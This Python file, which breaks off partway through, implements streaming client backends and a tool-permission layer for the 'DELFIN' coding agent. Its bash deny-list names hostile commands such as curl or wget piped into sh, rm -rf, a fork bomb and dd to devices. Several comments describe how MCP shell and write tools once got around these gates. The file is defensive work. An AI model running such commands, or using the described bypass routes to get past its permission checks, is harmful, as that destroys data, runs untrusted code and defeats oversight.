"""Client backends for the DELFIN Agent: Claude CLI, Anthropic API, OpenAI API, or Codex CLI."""

from __future__ import annotations

import difflib
import fnmatch
import importlib
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Generator, Optional


def _auto_install(package: str, pip_spec: str = "") -> None:
    """Install a missing Python package automatically via pip."""
    spec = pip_spec or package
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", "-q", spec],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    # Force re-import after install
    importlib.invalidate_caches()


# ---------------------------------------------------------------------------
# Shared event type
# ---------------------------------------------------------------------------

class StreamEvent:
    """A single event from a streaming model response."""

    __slots__ = ("type", "text", "input_tokens", "output_tokens", "stop_reason",
                 "cost_usd", "tool_name", "tool_input", "tool_output",
                 "cached_tokens")

    def __init__(
        self,
        type: str,
        text: str = "",
        input_tokens: int = 0,
        output_tokens: int = 0,
        stop_reason: str | None = None,
        cost_usd: float = 0.0,
        tool_name: str = "",
        tool_input: str = "",
        tool_output: str = "",
        cached_tokens: int = 0,
    ):
        self.type = type
        self.text = text
        self.input_tokens = input_tokens
        self.output_tokens = output_tokens
        self.stop_reason = stop_reason
        self.cost_usd = cost_usd
        self.tool_name = tool_name
        self.tool_input = tool_input
        self.tool_output = tool_output
        # Prompt tokens served from the endpoint's prefix cache (OpenAI/vLLM
        # ``prompt_tokens_details.cached_tokens`` or Anthropic
        # ``cache_read_input_tokens``). 0 when unreported. Lets us SEE caching.
        self.cached_tokens = cached_tokens


# ---------------------------------------------------------------------------
# Backend base
# ---------------------------------------------------------------------------

class _BaseClient:
    """Common interface for both backends."""

    def stream_message(
        self,
        system: str,
        messages: list[dict[str, Any]],
        max_tokens: int = 8192,
        session_id: str = "",
        thinking_budget: int = 0,
    ) -> Generator[StreamEvent, None, None]:
        raise NotImplementedError

    def signal_stop(self) -> None:
        """Cooperative stop: nudge a running turn to end without tearing down
        the underlying connection or session. Default is no-op; backends that
        own a long-lived subprocess should override to send SIGINT so the
        next turn can ``--resume`` the same conversation. The engine's
        ``request_stop`` flag handles the Python-side stream cutoff.
        """
        return None


# ---------------------------------------------------------------------------
# CLI backend (uses OAuth -- no API key needed)
# ---------------------------------------------------------------------------

class CLIClient(_BaseClient):
    """Persistent bidirectional Claude CLI client via ``--input-format stream-json``.

    Spawns a single long-running ``claude -p`` process that accepts JSON
    messages on stdin and emits JSON events on stdout — identical to what
    the terminal CLI does internally.  The process stays alive across
    multiple turns, giving the same context management, caching, and
    permission handling as the interactive terminal.

    Parameters
    ----------
    model : str
        Model alias (``"sonnet"``, ``"opus"``, ``"haiku"``).
    claude_path : str
        Path to the ``claude`` binary.  Auto-detected if empty.
    permission_mode : str
        CLI permission mode (``"default"``, ``"acceptEdits"``, etc.).
    """

    DEFAULT_MODEL = "sonnet"

    def __init__(self, model: str = "", claude_path: str = "",
                 permission_mode: str = "", cwd: str = "",
                 mcp_config: str = "",
                 allowed_tools: list[str] | None = None,
                 extra_dirs: list[str] | None = None,
                 effort: str = ""):
        self.model = model or self.DEFAULT_MODEL
        self.permission_mode = permission_mode
        self.cwd = cwd or None
        self.mcp_config = mcp_config  # path to MCP config JSON or empty
        self.allowed_tools = allowed_tools  # restrict CLI to these tools only
        self.extra_dirs = extra_dirs  # extra writable directories (--add-dir)
        # Effort level for reasoning/thinking (low/medium/high/xhigh/max).
        # Empty = use the CLI's default. Passed via `--effort <level>`.
        self.effort = (effort or "").strip().lower()
        self.claude_path = claude_path or shutil.which("claude") or "claude"
        if not shutil.which(self.claude_path):
            raise FileNotFoundError(
                f"Agent CLI binary not found at '{self.claude_path}'. "
                "Install it from https://claude.ai/code"
            )
        self._proc: subprocess.Popen | None = None
        self._session_id: str = ""

    def _ensure_proc(self, system: str, session_id: str = "") -> subprocess.Popen:
        """Start the persistent CLI process if not already running."""
        if self._proc is not None and self._proc.poll() is None:
            return self._proc

        cmd = [
            self.claude_path,
            "-p",
            "--input-format", "stream-json",
            "--output-format", "stream-json",
            "--verbose",
            "--include-partial-messages",
            "--include-hook-events",
            "--model", self.model,
            "--append-system-prompt", system,
        ]

        if self.permission_mode and self.permission_mode != "default":
            if self.permission_mode in ("auto", "bypassPermissions"):
                cmd.append("--dangerously-skip-permissions")
            else:
                cmd.extend(["--permission-mode", self.permission_mode])

        if self.mcp_config:
            cmd.extend(["--mcp-config", self.mcp_config])

        if self.allowed_tools is not None:
            cmd.extend(["--allowedTools", ",".join(self.allowed_tools)])

        if self.extra_dirs:
            for d in self.extra_dirs:
                cmd.extend(["--add-dir", d])

        if self.effort in ("low", "medium", "high", "xhigh", "max"):
            cmd.extend(["--effort", self.effort])

        if session_id:
            cmd.extend(["--resume", session_id])

        self._proc = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd=self.cwd,
        )
        return self._proc

    def stream_message(
        self,
        system: str,
        messages: list[dict[str, Any]],
        max_tokens: int = 8192,
        session_id: str = "",
        thinking_budget: int = 0,
    ) -> Generator[StreamEvent, None, None]:
        """Send a message and stream the response via the persistent process.

        The first call spawns the CLI process.  Subsequent calls re-use it,
        giving the same conversation continuity as the terminal CLI.
        """
        # Extract last user message
        prompt_text = ""
        for msg in reversed(messages):
            if msg["role"] == "user":
                prompt_text = msg["content"]
                break

        # Empty user content would cause the CLI to forward a content block
        # tagged with cache_control on empty text → Anthropic API rejects
        # with "cache_control cannot be set for empty text blocks". Skip the
        # send instead — caller can resume the existing session next turn.
        _text = prompt_text if isinstance(prompt_text, str) else ""
        if not _text.strip():
            return

        # Use existing session_id if we have one from a prior turn
        effective_sid = session_id or self._session_id

        proc = self._ensure_proc(system, session_id=effective_sid)

        # Build the stream-json input message
        user_msg = json.dumps({
            "type": "user",
            "message": {
                "role": "user",
                "content": [{"type": "text", "text": prompt_text}],
            },
        }, ensure_ascii=False)

        try:
            proc.stdin.write(user_msg + "\n")
            proc.stdin.flush()
        except (BrokenPipeError, OSError):
            # Process died — restart it
            self._proc = None
            proc = self._ensure_proc(system, session_id=effective_sid)
            proc.stdin.write(user_msg + "\n")
            proc.stdin.flush()

        # Read events until we get the "result" event (turn complete)
        yield from self._read_turn(proc)

    def _read_turn(self, proc: subprocess.Popen) -> Generator[StreamEvent, None, None]:
        """Read events from stdout until a ``result`` event marks turn end."""
        emitted_text = False
        current_tool_name = ""
        current_tool_input_chunks: list[str] = []
        in_thinking_block = False
        in_tool_result_block = False
        tool_result_chunks: list[str] = []
        # Map tool_use IDs to names so we can label tool_result events
        _tool_id_to_name: dict[str, str] = {}
        _last_tool_use_id = ""

        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                data = json.loads(line)
            except json.JSONDecodeError:
                continue

            dtype = data.get("type", "")

            if dtype == "system" and data.get("subtype") == "init":
                sid = data.get("session_id", "")
                if sid:
                    self._session_id = sid
                    yield StreamEvent(type="session_init", text=sid)

            elif dtype == "stream_event":
                evt = data.get("event", {})
                etype = evt.get("type", "")

                if etype == "content_block_start":
                    block = evt.get("content_block", {})
                    btype = block.get("type", "")
                    if btype == "tool_use":
                        current_tool_name = block.get("name", "")
                        current_tool_input_chunks = []
                        # Track tool_use ID for matching with tool_result
                        tid = block.get("id", "")
                        if tid and current_tool_name:
                            _tool_id_to_name[tid] = current_tool_name
                            _last_tool_use_id = tid
                    elif btype == "thinking":
                        in_thinking_block = True
                    elif btype == "tool_result":
                        in_tool_result_block = True
                        tool_result_chunks = []

                elif etype == "content_block_delta":
                    delta = evt.get("delta", {})
                    dtyp = delta.get("type", "")
                    if dtyp == "text_delta":
                        text = delta.get("text", "")
                        if text:
                            if in_tool_result_block:
                                tool_result_chunks.append(text)
                            else:
                                emitted_text = True
                                yield StreamEvent(type="text_delta", text=text)
                    elif dtyp == "thinking_delta":
                        text = delta.get("thinking", "")
                        if text:
                            yield StreamEvent(type="thinking_delta", text=text)
                    elif dtyp == "input_json_delta":
                        current_tool_input_chunks.append(
                            delta.get("partial_json", "")
                        )

                elif etype == "content_block_stop":
                    if in_thinking_block:
                        in_thinking_block = False
                    elif in_tool_result_block:
                        in_tool_result_block = False
                        result_text = "".join(tool_result_chunks)
                        if result_text:
                            # Match to last tool_use name if possible
                            result_tool = _tool_id_to_name.get(
                                _last_tool_use_id, ""
                            )
                            yield StreamEvent(
                                type="tool_result",
                                tool_name=result_tool,
                                tool_output=result_text,
                            )
                        tool_result_chunks = []
                    elif current_tool_name:
                        tool_input = "".join(current_tool_input_chunks)
                        yield StreamEvent(
                            type="tool_use",
                            tool_name=current_tool_name,
                            tool_input=tool_input,
                        )
                        current_tool_name = ""
                        current_tool_input_chunks = []

                elif etype == "message_start":
                    usage = (evt.get("message") or {}).get("usage", {})
                    inp = (
                        usage.get("input_tokens", 0)
                        + usage.get("cache_creation_input_tokens", 0)
                        + usage.get("cache_read_input_tokens", 0)
                    )
                    if inp:
                        yield StreamEvent(
                            type="message_start", input_tokens=inp
                        )

            elif dtype == "assistant":
                msg = data.get("message", {})
                for block in msg.get("content", []):
                    btype = block.get("type", "")
                    if btype == "tool_use":
                        tool_name = block.get("name", "")
                        tool_input = json.dumps(
                            block.get("input", {}), ensure_ascii=False
                        )
                        # Track ID
                        tid = block.get("id", "")
                        if tid and tool_name:
                            _tool_id_to_name[tid] = tool_name
                            _last_tool_use_id = tid
                        if not current_tool_name:
                            yield StreamEvent(
                                type="tool_use",
                                tool_name=tool_name,
                                tool_input=tool_input,
                            )

            elif dtype == "user":
                # User messages contain tool_result blocks (CLI internal)
                msg = data.get("message", {})
                for block in msg.get("content", []):
                    if block.get("type") == "tool_result":
                        content = block.get("content", "")
                        # content can be string or list of content blocks
                        if isinstance(content, list):
                            parts = []
                            for cb in content:
                                if isinstance(cb, dict) and cb.get("type") == "text":
                                    parts.append(cb.get("text", ""))
                            content = "\n".join(parts)
                        if content:
                            tid = block.get("tool_use_id", "")
                            result_tool = _tool_id_to_name.get(tid, "")
                            yield StreamEvent(
                                type="tool_result",
                                tool_name=result_tool,
                                tool_output=str(content),
                            )

            elif dtype == "result":
                usage = data.get("usage", {})
                total_input = (
                    usage.get("input_tokens", 0)
                    + usage.get("cache_creation_input_tokens", 0)
                    + usage.get("cache_read_input_tokens", 0)
                )
                total_output = usage.get("output_tokens", 0)
                total_cost = data.get("total_cost_usd", 0.0)
                sid = data.get("session_id", "")
                if sid:
                    self._session_id = sid

                for denial in data.get("permission_denials", []):
                    yield StreamEvent(
                        type="permission_denied",
                        tool_name=str(denial),
                    )

                if not emitted_text:
                    result_text = data.get("result", "")
                    if result_text:
                        yield StreamEvent(type="text_delta", text=result_text)

                yield StreamEvent(
                    type="message_delta",
                    input_tokens=total_input,
                    output_tokens=total_output,
                    cost_usd=total_cost,
                    stop_reason=data.get("stop_reason", "end_turn"),
                    text=sid,
                )
                # Turn complete — stop reading, wait for next send
                return

        # If we exit the loop, the process died or finished unexpectedly
        rc = proc.poll()
        if rc is not None:
            # Always clear dead process reference so _ensure_proc() restarts
            self._proc = None
            if rc != 0:
                stderr = proc.stderr.read() if proc.stderr else ""
                if "Not logged in" in stderr:
                    raise RuntimeError(
                        "Agent CLI is not logged in. "
                        "Run 'claude' in a terminal and complete login first."
                    )
                if stderr.strip():
                    raise RuntimeError(
                        f"Claude CLI error (exit {rc}): {stderr.strip()[:500]}"
                    )

    def switch_model(self, model: str) -> None:
        """Switch the model by killing the current process.

        The next ``stream_message`` call will spawn a new process with
        the updated model.  The session ID is preserved so conversation
        context is maintained via ``--resume``.
        """
        if model and model != self.model:
            self.kill()
            self.model = model

    def kill(self) -> None:
        """Kill the persistent CLI process."""
        if self._proc is not None:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=5)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass
            self._proc = None

    def signal_stop(self) -> None:
        """Soft-stop: SIGINT the CLI subprocess so the current turn ends
        cooperatively. The session_id is preserved so the next send can
        resume via ``--resume``. If SIGINT fails or the process is gone,
        we fall back to a regular kill (still safe — resume handles it).
        """
        proc = self._proc
        if proc is None or proc.poll() is not None:
            return
        try:
            proc.send_signal(signal.SIGINT)
        except Exception:
            try:
                proc.terminate()
            except Exception:
                pass
            self._proc = None

    @property
    def session_id(self) -> str:
        """Return the current CLI session ID."""
        return self._session_id


# ---------------------------------------------------------------------------
# API backend (uses Anthropic API key)
# ---------------------------------------------------------------------------

class APIClient(_BaseClient):
    """Use the Anthropic Python SDK directly.

    Requires an API key (``ANTHROPIC_API_KEY`` or passed explicitly).
    Supports text streaming, extended thinking, tool_use events,
    cost tracking, and model switching.
    """

    DEFAULT_MODEL = "claude-sonnet-4-20250514"

    # Pricing per million tokens (USD).
    _PRICING: dict[str, tuple[float, float]] = {
        "claude-opus-4-20250514": (15.0, 75.0),
        "claude-sonnet-4-20250514": (3.0, 15.0),
        "claude-haiku-4-5-20251001": (0.80, 4.0),
    }

    def __init__(self, api_key: str = "", model: str = ""):
        try:
            import anthropic  # noqa: F401
        except ImportError:
            _auto_install("anthropic", "anthropic>=0.40")
            import anthropic  # noqa: F401
        from .credentials import load_credential as _load_cred_anth
        resolved_key = api_key or _load_cred_anth("ANTHROPIC_API_KEY")
        if not resolved_key:
            raise ValueError(
                "No Anthropic API key found. Either set ANTHROPIC_API_KEY in "
                "the environment, or run `python -m delfin.agent.cli "
                "credentials set ANTHROPIC_API_KEY` to store it in "
                "~/.delfin/credentials.json (chmod 0600)."
            )
        import anthropic

        self.model = model or self.DEFAULT_MODEL
        self.client = anthropic.Anthropic(api_key=resolved_key)

    def switch_model(self, model: str) -> None:
        """Switch model (no process to kill, just update the name)."""
        if model and model != self.model:
            self.model = model

    def kill(self) -> None:
        """No-op — API client has no persistent process."""

    @property
    def session_id(self) -> str:
        """API backend has no session concept."""
        return ""

    def _estimate_cost(self, input_tokens: int, output_tokens: int) -> float:
        pricing = self._PRICING.get(self.model)
        if not pricing:
            # Fallback: assume Sonnet pricing
            pricing = (3.0, 15.0)
        return (input_tokens * pricing[0] + output_tokens * pricing[1]) / 1_000_000

    def stream_message(
        self,
        system: str,
        messages: list[dict[str, Any]],
        max_tokens: int = 8192,
        session_id: str = "",
        thinking_budget: int = 0,
    ) -> Generator[StreamEvent, None, None]:
        """Stream via the Anthropic Messages API.

        Handles text, thinking, tool_use, and cost events.
        """
        kwargs: dict[str, Any] = {
            "model": self.model,
            "max_tokens": max_tokens,
            "system": system,
            "messages": messages,
        }
        if thinking_budget > 0:
            kwargs["thinking"] = {
                "type": "enabled",
                "budget_tokens": thinking_budget,
            }

        _in_thinking = False
        _in_tool_use = False
        _tool_name = ""
        _tool_input_chunks: list[str] = []
        _total_in = 0
        _total_out = 0

        with self.client.messages.stream(**kwargs) as stream:
            for event in stream:
                etype = getattr(event, "type", "")

                if etype == "message_start":
                    usage = getattr(
                        getattr(event, "message", None), "usage", None
                    )
                    if usage:
                        _total_in = getattr(usage, "input_tokens", 0)
                        cache_creation = getattr(usage, "cache_creation_input_tokens", 0)
                        cache_read = getattr(usage, "cache_read_input_tokens", 0)
                        _total_in += cache_creation + cache_read
                        yield StreamEvent(
                            type="message_start",
                            input_tokens=_total_in,
                            cached_tokens=cache_read,
                        )

                elif etype == "content_block_start":
                    block = getattr(event, "content_block", None)
                    block_type = getattr(block, "type", "") if block else ""
                    if block_type == "thinking":
                        _in_thinking = True
                    elif block_type == "tool_use":
                        _in_tool_use = True
                        _tool_name = getattr(block, "name", "")
                        _tool_input_chunks.clear()

                elif etype == "content_block_delta":
                    delta = getattr(event, "delta", None)
                    if not delta:
                        continue
                    delta_type = getattr(delta, "type", "")
                    if delta_type == "text_delta":
                        yield StreamEvent(
                            type="text_delta",
                            text=getattr(delta, "text", ""),
                        )
                    elif delta_type == "thinking_delta":
                        yield StreamEvent(
                            type="thinking_delta",
                            text=getattr(delta, "thinking", ""),
                        )
                    elif delta_type == "input_json_delta":
                        _tool_input_chunks.append(
                            getattr(delta, "partial_json", "")
                        )

                elif etype == "content_block_stop":
                    if _in_thinking:
                        _in_thinking = False
                    if _in_tool_use:
                        _in_tool_use = False
                        tool_input = "".join(_tool_input_chunks)
                        yield StreamEvent(
                            type="tool_use",
                            tool_name=_tool_name,
                            tool_input=tool_input,
                        )
                        _tool_name = ""
                        _tool_input_chunks.clear()

                elif etype == "message_delta":
                    usage = getattr(event, "usage", None)
                    out_tokens = (
                        getattr(usage, "output_tokens", 0) if usage else 0
                    )
                    _total_out = out_tokens
                    cost = self._estimate_cost(_total_in, _total_out)
                    yield StreamEvent(
                        type="message_delta",
                        output_tokens=out_tokens,
                        stop_reason=(
                            getattr(event.delta, "stop_reason", None)
                            if hasattr(event, "delta")
                            else None
                        ),
                        cost_usd=cost,
                    )


# ---------------------------------------------------------------------------
# OpenAI backend (uses OpenAI API key)
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# KIT-Toolbox coding-agent permissions (.delfin-style safety layer)
# ---------------------------------------------------------------------------

# Bash patterns that are ALWAYS rejected (case-insensitive substring/regex
# match against the raw command string). Keep this list tight: false positives
# block the user, but missing entries can cause real damage.
_DEFAULT_BASH_DENY_PATTERNS: tuple[str, ...] = (
    r"\brm\s+(-[a-zA-Z]*[rR][a-zA-Z]*[fF]|-[a-zA-Z]*[fF][a-zA-Z]*[rR])\b",
    r"\brm\s+-[a-zA-Z]*\s+/(?:\s|$)",
    r"\bdd\s+if=",
    r"\bdd\s+of=/dev/",
    r"\bmkfs(\.|\s)",
    r"\b(shutdown|reboot|halt|poweroff|init\s+0|init\s+6)\b",
    r"\bsudo\b",
    r"(?:^|\s)su\s+-",
    r"git\s+push\s+(?:[^|;&]*\s)?(?:--force(?!-with-lease)|-f\b)",
    r"git\s+reset\s+--hard\b",
    r"git\s+branch\s+-D\b",
    r"git\s+branch\s+-d\b",                # local branch delete (gentle form)
    r"git\s+branch\s+--delete\b",
    r"git\s+push\s+[^|;&]*--delete\b",     # remote branch delete
    r"git\s+push\s+\S+\s+:\S",             # legacy 'git push origin :branch' delete
    r"git\s+tag\s+-d\b",                   # tag delete
    r"git\s+tag\s+--delete\b",
    r"git\s+worktree\s+remove\b",
    r"git\s+clean\s+-[a-zA-Z]*f[a-zA-Z]*d",
    r"git\s+update-ref\s+-d\b",
    r"git\s+filter-(?:branch|repo)\b",     # history rewriting
    r">\s*/dev/(sd|nvme|hd|xvd)",
    r">\s*/etc/",
    r"\bchmod\s+-?R?\s*777\b",
    r":\s*\(\s*\)\s*\{",  # fork bomb
    r"\bcurl\b[^|;]*\|\s*(?:sh|bash|zsh)",
    r"\bwget\b[^|;]*\|\s*(?:sh|bash|zsh)",
    r"--break-system-packages\b",
    r"\bnpm\s+publish\b",
    r"\bpip\s+install\b[^|;]*--target\s+/(?:usr|etc|bin|lib|var)",
    r"\bcrontab\s+-r\b",
)

# Bash patterns that are auto-approved in mode="default" without callback.
# Two categories:
#   (a) Read-only / informational shell commands.
#   (b) Coding-workflow commands that are ubiquitous and not destructive
#       outside the workspace (test runners, formatters, type checkers,
#       compile-only invocations). Anything that pushes to remote, publishes,
#       installs into system paths, or touches /dev|/etc must NOT be here —
#       the bash deny-list catches the obvious cases anyway.
_DEFAULT_BASH_AUTO_ALLOW: tuple[str, ...] = (
    # -- (a) read-only / info --------------------------------------------
    r"^\s*(?:ls|pwd|whoami|hostname|uname|id|date|uptime|df|du|free|tree)\b",
    r"^\s*(?:cat|head|tail|wc|file|stat|which|type|env|printenv|sort|uniq|cut|tr)\b",
    r"^\s*(?:basename|dirname|realpath|readlink)\b",
    r"^\s*echo\b",
    # cd <literal-path>: harmless on its own (it executes nothing, and each
    # bash call is a fresh subprocess) and the common prefix in
    # `cd /path && <cmd>`. Auto-allowed ONLY for a literal path — the char class
    # excludes $ ( ` so no command/variable substitution sneaks in — so the
    # segment-wise gate still judges the rest of the compound on its own merits.
    # Effect: a harmless command no longer needs approval just for a cd prefix.
    r"^\s*cd\s+[A-Za-z0-9_./~@:+=-]+\s*$",
    r"^\s*find\b(?![^|;&]*-delete)(?![^|;&]*-exec[^|;&]*rm)",
    r"^\s*grep\b", r"^\s*rg\b", r"^\s*ag\b",
    r"^\s*sed\s+-n\b",                                       # read-only sed
    r"^\s*awk\s+",                                           # awk has no destructive default
    r"^\s*jq\b", r"^\s*yq\b",
    r"^\s*git\s+(?:status|diff|log|show|branch(?!\s+-D)|remote|config\s+--get|"
    r"rev-parse|describe|ls-files|ls-tree|blame|stash\s+list|tag\s*$|"
    r"shortlog|reflog|fetch|pull(?!\s+--rebase\s+--force)|switch|checkout|add|"
    # NOTE: 'push' is deliberately NOT here. Pushing publishes to a remote — an
    # outward-facing, hard-to-undo action (it can hit a shared/protected branch
    # like main). Per this list's own policy ("Anything that pushes to remote …
    # must NOT be here") it must go through the confirm gate, never auto-run.
    r"restore(?!\s+--source)|commit\s+-m|commit\s+--message|stash|init)\b",
    r"^\s*tar\s+-?t",                                        # tar list-only
    r"^\s*unzip\s+-l\b",
    # -- (b) coding workflow ---------------------------------------------
    r"^\s*python(?:3(?:\.\d+)?)?\s+-c\s+",
    r"^\s*python(?:3(?:\.\d+)?)?\s+--version\b",
    r"^\s*python(?:3(?:\.\d+)?)?\s+-m\s+(?:py_compile|pytest|unittest|doctest|timeit|venv|"
    r"pip\s+show|pip\s+list|pip\s+freeze|"
    r"compileall|json\.tool|http\.server|delfin(?:\.\w+)*)\b",
    r"^\s*python(?:3(?:\.\d+)?)?\s+\S+\.py\b",                             # run a script in repo
    r"^\s*pip\s+(?:show|list|freeze|check)\b",
    r"^\s*conda\s+(?:info|list|env\s+list|search)\b",
    r"^\s*(?:pytest|py\.test)\b",
    r"^\s*(?:ruff|black|isort|flake8|pylint|mypy|pyright|pyflakes|bandit)\b",
    r"^\s*(?:nox|tox)\s+--?l", r"^\s*tox\s+-e\b",
    r"^\s*make(?!\s+(?:clean|distclean|uninstall|purge))\b",
    r"^\s*mkdir\s+-p\b",
    r"^\s*touch\s+(?!/)",                                    # only relative paths
    r"^\s*cp\s+(?!.*[\s/]/(?:etc|usr|bin|lib|var))",         # disallow copy to system dirs
    r"^\s*mv\s+(?!.*[\s/]/(?:etc|usr|bin|lib|var))",
    r"^\s*chmod\s+(?:[ugoa+=-]+|[0-7]{3,4})\s+",             # any chmod except 777 (deny-list)
    r"^\s*time\s+",
    r"^\s*timeout\s+\d",
    r"^\s*xargs\s+",
    r"^\s*diff\b", r"^\s*patch\s+(?:-p\d|--dry-run)",
)

# DELFIN-specific bash auto-allow patterns — merged into the auto-allow
# list only when the workspace is actually a DELFIN repository.
# Keeping them out by default avoids surprising "agent runs xtb on user
# files" behaviour for non-DELFIN projects.
_DELFIN_BASH_AUTO_ALLOW: tuple[str, ...] = (
    r"^\s*xtb\s+\S+\.xyz\b",          # read-only xtb invocation
    r"^\s*delfin(?:-\w+)?\b",         # delfin CLI wrappers
)

# Shell-executing MCP tools (by their un-namespaced base name). An MCP
# backend such as KIT-Toolbox exposes ``mcp__kit-coding__bash``, which runs
# the command REMOTELY and therefore never reaches the native bash executor
# — bypassing the deny-list, secret/egress scan, and confirm/head-less gate.
# Any MCP tool whose base name is in this set is routed through the SAME bash
# content-gate before it is forwarded (see ``_gate_mcp_tool``). Kept
# conservative — only unmistakable shell executors — so ordinary MCP tools
# (read_file, search, …) are never touched.
_MCP_BASH_TOOL_BASES: frozenset[str] = frozenset({
    "bash", "bash_background", "shell", "sh",
    "run", "run_command", "run_bash", "exec", "execute",
})
# Argument keys an MCP shell tool may carry the command under. The verified
# key for ``mcp__kit-coding__bash`` is ``command``; the others cover common
# MCP-server conventions so a differently-named shell tool is still gated.
_MCP_BASH_CMD_KEYS: tuple[str, ...] = ("command", "cmd", "script", "code")

# File-mutating MCP tools mapped to the native tool whose permission gate
# governs them. Like the shell tools above, these dispatch straight to the
# remote server and would otherwise bypass the write gate (sandbox +
# read-only/self-mod-guard/calc-confirm). Verified from traces that the KIT
# backend exposes them with the SAME arg shape as the native tools
# (write_file→path/content, edit_file→path/old_string/new_string,
# multi_edit→path/edits, notebook_edit→path/cell_idx/source) and that they
# operate on the same local workspace paths, so the native path-based gate
# applies unchanged. notebook_edit reuses edit_file's gate — exactly as the
# native dispatch does. apply_patch maps to its own ``_run_permission_gate``
# branch, which gates every file the diff touches with the write tiers.
_MCP_WRITE_GATE_MAP: dict[str, str] = {
    "write_file": "write_file",
    "edit_file": "edit_file",
    "multi_edit": "multi_edit",
    "notebook_edit": "edit_file",
    "apply_patch": "apply_patch",
}


# DELFIN-only tool names. Filtered out of the advertised tool list when
# the workspace isn't a DELFIN repo, so generic projects don't see a
# search_calcs/get_calc_info that would return zero results anyway.
_DELFIN_ONLY_TOOL_NAMES: frozenset[str] = frozenset({
    "search_calcs", "get_calc_info", "calc_summary",
    "search_docs", "read_section", "list_docs", "list_sections",
})

# Refusal returned when a task tool would START execution while in plan mode.
# Creating a task list, or moving a task to in_progress/completed, is an
# execution act — plan mode is read-only and must wait for user approval.
_PLAN_MODE_TASK_REJECT = (
    "plan mode (read-only) — creating or starting tasks is blocked while "
    "planning. Present the plan in chat and call exit_plan_mode to submit it "
    "for approval (the user can also click 'Plan akzeptieren & ausführen' or "
    "switch the mode chip to 'acceptEdits'). Tasks are created once the plan "
    "is approved."
)

# Tools advertised to the dashboard-agent role. Mutating tools (bash,
# write_file, edit_file, ...) are deliberately excluded — the dashboard
# agent drives the UI via ACTION: slash-commands, not via direct file or
# shell access. Keep this list small and read-only.
_DASHBOARD_AGENT_ALLOWED_TOOLS: frozenset[str] = frozenset({
    # Doc / calc search — the dashboard agent's research surface.
    "search_docs", "read_section", "list_docs", "list_sections",
    "search_calcs", "get_calc_info", "calc_summary",
    # Web research as last-resort fallback.
    "web_search", "web_fetch",
    # Structured UX & planning.
    "ask_user_question",
    "task_create", "task_update", "task_list", "task_get",
    # Persistent memory — remember durable user facts/preferences across sessions.
    "remember",
})


# --- Central execution authorization (deny-by-default per role) -------------
# The single source of truth for "which tools may this role EXECUTE", enforced
# at the one choke point every tool passes through (``_DocToolExecutor.execute``)
# — independent of how the tool was advertised or namespaced. This closes the
# structural bypass behind bug 20260708-092217: the engine's per-role tool
# whitelist exempts every ``mcp__delfin-docs__``/``mcp__kit-coding__`` tool
# ("already permission-gated"), so the dashboard guide reached read_file /
# grep_file / list_files / bash through the KIT backend. Re-checking at
# execution time makes that leak impossible regardless of the advertising path,
# and gives a defense-in-depth net for any tool whose own handler forgets a
# check. Only roles that appear here are restricted; every other role stays
# unrestricted at this layer (its per-tool + plan-mode gates still apply).
_ROLE_EXEC_ALLOWLIST: dict[str, frozenset[str]] = {
    "dashboard_agent": _DASHBOARD_AGENT_ALLOWED_TOOLS,
}

# Meta/plumbing tools with no side effects or scope concern — always permitted
# even for a role that carries an allow-list.
_ALWAYS_ALLOWED_TOOLS: frozenset[str] = frozenset({
    "exit_plan_mode", "ask_user_question", "subagent_result",
})


def _tool_denied_for_role(role: str, name: str) -> bool:
    """Deny-by-default per-role execution check (pure, testable).

    Returns True when *role* has a defined execution allow-list AND *name*
    is not on it. Roles without an allow-list are never denied here. The
    ``mcp__server__tool`` namespace is stripped so a namespaced call is
    judged by its underlying tool name.
    """
    allow = _ROLE_EXEC_ALLOWLIST.get(role or "")
    if allow is None:
        return False
    base = name.rsplit("__", 1)[-1] if name.startswith("mcp__") else name
    if name in _ALWAYS_ALLOWED_TOOLS or base in _ALWAYS_ALLOWED_TOOLS:
        return False
    return base not in allow

# Tools advertised to weak local models (gemma-7b, llama-8b, qwen-7b,
# phi-3.5, mistral-7b, codellama-7b). 15-tool core that covers 95% of
# real agent use without overwhelming the model's tool-routing
# attention. Strong models keep the full 45+ surface — they handle
# disambiguation reliably; weak ones routinely pick the wrong tool
# out of a large schema (notebook_edit for a Python file, cron_create
# instead of /control key, etc.).
# Max seconds a single bash_status(wait_seconds=…) call blocks server-side
# before returning. Keeps one tool round covering a long wait (so the model
# stops tight-polling and exhausting the tool-round budget) while bounding the
# apparent UI freeze; the model can call again to keep waiting.
_BASH_STATUS_WAIT_CAP_S = 300.0

# Busy-poll guard: even when the model omits wait_seconds, a tight loop of
# status checks on a still-running job burns the tool-round budget (bug
# 20260615-152119: ~3-4s polling exhausted it before a ~10-min run finished).
# The FIRST check returns an instant snapshot; a re-check of the SAME running
# job within this window is throttled with a server-side wait (still returns
# early the instant the job ends). Doubles as the window and the wait length.
_BASH_STATUS_BUSY_POLL_WAIT_S = 15.0

# Minimum max_tokens for a reasoning model. They spend part of the budget
# THINKING before any visible answer; too small a cap returns an empty reply
# (budget consumed mid-<think>). Floor any smaller request to this.
_REASONING_MIN_TOKENS = 2048


_WEAK_MODEL_CORE_TOOLS: frozenset[str] = frozenset({
    # File-system core
    "read_file", "write_file", "edit_file", "multi_edit",
    "grep_file", "list_files",
    # Shell + verification
    "bash", "run_tests",
    # User interaction
    "ask_user_question",
    # Planning + delegation
    "task_create", "task_update", "task_list",
    "subagent", "subagent_result",
    # Web fallback for simple lookups
    "web_search",
    # Skill invocation (lets the user route weak models through
    # well-defined prompt templates)
    "skill",
})


def _is_delfin_workspace(workspace: Path | str | None) -> bool:
    """Return True iff *workspace* looks like a DELFIN source tree.

    Detection rule: either ``delfin/agent/__init__.py`` or
    ``delfin/__init__.py`` is present at the workspace root. Errs on
    the side of "not DELFIN" — false negatives just mean Jerome's
    private project gets a leaner tool surface, which is the goal.
    """
    if workspace is None:
        return False
    try:
        ws = Path(workspace).expanduser().resolve()
    except Exception:
        return False
    if not ws.is_dir():
        return False
    if (ws / "delfin" / "agent" / "__init__.py").is_file():
        return True
